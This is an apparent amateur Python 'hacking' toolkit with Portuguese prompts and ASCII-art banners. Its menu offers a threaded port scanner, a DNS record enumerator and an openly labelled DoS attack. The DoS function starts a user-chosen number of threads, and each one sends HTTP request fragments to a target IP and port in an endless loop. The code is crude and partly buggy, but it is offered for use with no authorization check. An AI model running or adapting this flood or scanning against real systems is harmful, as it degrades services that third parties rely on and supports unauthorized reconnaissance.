import os
import socket
from concurrent.futures import ThreadPoolExecutor
import dns.resolver
import threading
import time

def scan_port(host, port):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(1)
            s.connect((host, port))
            return port, True
    except:
        return port, False

def port_scanner():
    print("\033[34m")
    print("                     _                             ")
    print("                    | |                            ")
    print(" _ __    ___   _ __ | |_  ___   ___   __ _  _ __  ")
    print("| '_ \  / _ \ | '__|| __|/ __| / __| / _` || '_ \ ")
    print("| |_) || (_) || |   | |_ \\__ \\| (__ | (_| || | | |")
    print("| .__/  \\___/ |_|    \\__||___/ \\___| \\__,_||_| |_|")
    print("| |                                               ")
    print("|_|                                               ")
    print("\033[0m")
    
    url = input("Digite o URL (sem http/https): ").strip()
    try:
        host = socket.gethostbyname(url)
    except socket.gaierror:
        print("Erro: URL inválida ou não resolvida.")
        return

    print(f"Iniciando scan em {host}...")
    portas = range(1, 1025)
    abertas = []

    with ThreadPoolExecutor(max_workers=50) as executor:
        resultados = executor.map(lambda p: scan_port(host, p), portas)

    for port, is_open in resultados:
        if is_open:
            abertas.append(port)
    
    if abertas:
        print(f"Portas abertas encontradas: {', '.join(map(str, abertas))}")
    else:
        print("Nenhuma porta aberta encontrada.")

def dns_enumerator():
    print("\033[34m")
    print("    _                                              ")
    print("   | |                                             ")
    print(" __| | _ __   ___    ___  _ __   _   _  _ __ ___   ")
    print("/ _` || '_ \\ / __|  / _ \\| '_ \\ | | | || '_ ` _ \\  ")
    print("| (_| || | | |\\__ \\ |  __/| | | || |_| || | | | | | ")
    print(" \\__,_||_| |_||___/  \\___||_| |_| \\__,_||_| |_| |_|")
    print("                                                  ")
    print("                                                  ")
    print("\033[0m")

    domain = input("Digite o domínio para enumerar (exemplo: google.com): ").strip()
    
    if not domain:
        print("Erro: O domínio não pode estar vazio.")
        return

    try:
        print(f"\nEnumerando registros DNS para: {domain}\n")
        dns_types = ["A", "AAAA", "MX", "NS", "TXT", "CNAME", "SOA", "PTR"]

        for record_type in dns_types:
            try:
                answers = dns.resolver.resolve(domain, record_type)
                print(f"Registros {record_type}:")
                for answer in answers:
                    print(f"  {answer.to_text()}")
            except dns.resolver.NoAnswer:
                print(f"  Nenhum registro {record_type} encontrado.")
            except dns.resolver.NXDOMAIN:
                print("  Domínio não existe.")
                break
            except dns.resolver.Timeout:
                print("  Timeout ao consultar registros.")
                break
    except Exception as e:
        print(f"Erro inesperado: {e}")

def dos_attack(target_ip, target_port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        sock.connect((target_ip, target_port))
        print(f"Conectando ao alvo {target_ip}:{target_port}")
        
        while True:
            sock.sendto(b"GET / HTTP/1.1\r\n", (target_ip, target_port))
            print("\033[32mPacote enviado para {target_ip}:{target_port}\033[0m")
            time.sleep(0.1)
    
    except socket.error as e:
        print(f"Erro ao conectar: {e}")
    finally:
        sock.close()

def start_dos_attack():
    print("\033[31m")
    print(" _____           _____ ")
    print("|  __ \\         / ____|")
    print("| |  | |  ___  | (___  ")
    print("| |  | | / _ \\  \\___ \\ ")
    print("| |__| || (_) | ____) |")
    print("|_____/  \\___/ |_____/ ")
    print("                        ")
    print("\033[0m")
    
    print("Iniciando ataque DoS...")

    target_ip = input("Digite o IP do alvo: ").strip()
    target_port = int(input("Digite a porta do alvo: ").strip())

    num_threads = int(input("Digite o número de threads: ").strip())

    print(f"Iniciando {num_threads} threads para atacar {target_ip}:{target_port}")

    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=dos_attack, args=(target_ip, target_port))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

def menu():
    while True:
        print("\033[31m")
        print("_                     _____                            ")
        print("| |                   / ____|                           ")
        print("| |       ___   ___  | (___    ___   __ _  _ __  _   _ ")
        print("| |      / _ \\ / __|  \\___ \\  / __| / _` || '__|| | | |")
        print("| |____ | (_) |\\__ \\  ____) || (__ | (_| || |   | |_| |")
        print("|______| \\___/ |___/ |_____/  \\___| \\__,_||_|    \\__, |")
        print("                                                  __/ |")
        print("                                                 |___/ ")
        print("\033[0m")
        
        print("\033[32mEscolhe uma ferramenta ai maldito\033[0m")
        print("1. Port Scanner")
        print("2. DNS ENUM")
        print("3. DoS Attack")
        print("4. Sair")
        escolha = input("Escolha uma opção: ").strip()
        
        if escolha == "1":
            port_scanner()
        elif escolha == "2":
            dns_enumerator()
        elif escolha == "3":
            start_dos_attack()
        elif escolha == "4":
            print("Saindo... falouu")
            break
        else:
            print("\033[31mOpção inválida. Tente novamente.\033[0m")
            input("Pressione Enter para continuar...")

menu()
